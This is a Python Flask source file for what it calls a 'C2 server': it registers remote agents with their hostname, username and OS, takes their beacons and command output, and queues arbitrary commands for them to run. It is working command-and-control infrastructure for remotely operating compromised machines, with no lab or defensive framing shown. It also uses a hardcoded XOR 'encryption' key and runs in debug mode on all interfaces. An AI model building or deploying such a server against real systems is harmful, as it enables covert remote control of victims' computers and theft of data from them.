from flask import Flask, request, jsonify
import os
import base64
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

app = Flask(__name__)

# In-memory storage for agents (would use database in production)
agents = {}

# Temporary encryption key (would use better key management in production)
ENCRYPTION_KEY = os.urandom(32)

def encrypt_message(message):
    # Use a simple XOR encryption for now
    key = b'THISISASECRETKEY'
    result = bytearray()
    for i in range(len(message)):
        result.append(message[i].encode()[0] ^ key[i % len(key)])
    return base64.b64encode(result).decode('utf-8')

def decrypt_message(encrypted_message):
    # Simple XOR decryption
    key = b'THISISASECRETKEY'
    decoded = base64.b64decode(encrypted_message)
    result = bytearray()
    for i in range(len(decoded)):
        result.append(decoded[i] ^ key[i % len(key)])
    return result.decode('utf-8')

@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.json
        agent_id = data.get('id', os.urandom(8).hex())
        hostname = data.get('hostname', 'unknown')
        username = data.get('username', 'unknown')
        os_info = data.get('os', 'unknown')
        
        # Store agent information
        agents[agent_id] = {
            'hostname': hostname,
            'username': username,
            'os': os_info,
            'last_seen': 'now',
            'commands': []  # Queue for commands to be sent to agent
        }
        
        print(f"[+] New agent registered: {agent_id} ({hostname})")
        return jsonify({'status': 'success', 'id': agent_id})
    except Exception as e:
        print(f"[-] Error during registration: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/beacon', methods=['POST'])
def beacon():
    try:
        print(f"Received beacon data: {request.data}")
        data = request.json
        print(f"Parsed JSON data: {data}")
        
        agent_id = data.get('id')
        if agent_id not in agents:
            print(f"Unknown agent ID: {agent_id}")
            return jsonify({'status': 'error', 'message': 'Unknown agent'})
        
        # Update agent's last seen timestamp
        agents[agent_id]['last_seen'] = 'now'
        
        # Process any data sent by the agent
        if 'output' in data:
            print(f"[+] Output from {agent_id}: {data['output']}")
        
        # Send any queued commands to the agent
        commands = agents[agent_id].get('commands', [])
        print(f"Sending commands to agent: {commands}")
        
        response_data = {
            'status': 'success',
            'commands': commands
        }
        
        # Clear the command queue
        agents[agent_id]['commands'] = []
        
        print(f"Response to agent: {response_data}")
        return jsonify(response_data)
    except Exception as e:
        print(f"[-] Error during beacon: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/command', methods=['POST'])
def add_command():
    try:
        data = request.json
        agent_id = data.get('id')
        command = data.get('command')
        
        if agent_id not in agents:
            return jsonify({'status': 'error', 'message': 'Unknown agent'})
        
        agents[agent_id]['commands'].append(command)
        print(f"[+] Command queued for {agent_id}: {command}")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[-] Error adding command: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/agents', methods=['GET'])
def list_agents():
    print(f"Current agents: {agents}")
    return jsonify({'agents': [{'id': k, **v} for k, v in agents.items()]})

if __name__ == '__main__':
    print("[+] C2 server starting...")
    app.run(host='0.0.0.0', port=5050, debug=True)

# Server needs to send output to the cli